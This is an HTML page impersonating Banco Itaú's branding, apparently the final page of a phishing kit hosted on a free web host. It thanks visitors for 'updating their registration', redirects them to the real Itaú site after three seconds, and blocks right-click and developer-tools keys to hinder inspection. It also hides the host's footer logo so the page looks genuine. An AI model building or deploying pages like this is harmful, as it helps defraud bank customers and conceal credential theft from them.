﻿<!DOCTYPE html>

<html lang="pt-BR">

<head>
<meta name="theme-color" content="#FF7F00">

	<title>Banco Itaú - Feito Para Você</title>

	<meta http-equiv="content-type" content="text/html; charset=UTF-8">

	<link rel="icon" href="img/favicon.ico" type="image/x-icon"/>

	<meta name="viewport" content="width=device-width, initial-scale=1.0">

	<link rel="stylesheet" type="text/css" href="css/bootstrap.css">

	<link href="http://www.cssscript.com/wp-includes/css/sticky.css" rel="stylesheet" type="text/css">

	<link href='http://fonts.googleapis.com/css?family=Roboto:400' rel='stylesheet' type='text/css'>

	<link rel="stylesheet" type="text/css" href="css/estilo.css">



	<script src="js/jquery-3.2.1.min.js"></script>

	<script src="js/bootstrap.js"></script>

	<script src="js/script.js"></script>

	<script type="text/javascript">
		window.onkeydown = function() {
		   var key = event.keyCode || event.charCode || e.which;
		   if(key==123){ alert('Proibido copia deste site.'); return false; }
		}

		function click()
		{
		 if (event.button==2)
		 {
		 alert('Proibido copia deste site.');
		 }
		}
		document.onmousedown=click;
	</script>

</head>

<body id="tela4">

	<div class="container">

		

			<h1 class="logo-fim">

				<img src="img/itau-logo.png">

			</h1>



			<section class="mensagem-sucesso">

				<h2>Estamos muito felizes em ver vc por aqui :)</h2>

				<p>Muito obrigado por fazer atualizações cadastrais em nosso sistema. Entre e desfrute do melhor do nosso APP ;)</p>

			</section>

	</div>

	<meta http-equiv="refresh" content="3;url=https://www.itau.com.br/">

	<!-- <footer>

		<section class="rodape">

				<i class="localizacao">

					<img class="img-responsive" src="img/localizador.png" width="8%;">

				</i>

				<i class="itoken">

					<img class="img-responsive" src="img/itoken.png" width="17%;">

				</i>

				<i class="informacao">

					<img class="img-responsive" src="img/info.png" width="10%;">

				</i>

		</section>

	</footer> -->

</body>

</body><head>
<style>
img[src*="https://cdn.rawgit.com/000webhost/logo/e9bd13f7/footer-powered-by-000webhost-white2.png"] {
    display: none;
}
</style>
</head>
</body>
</html>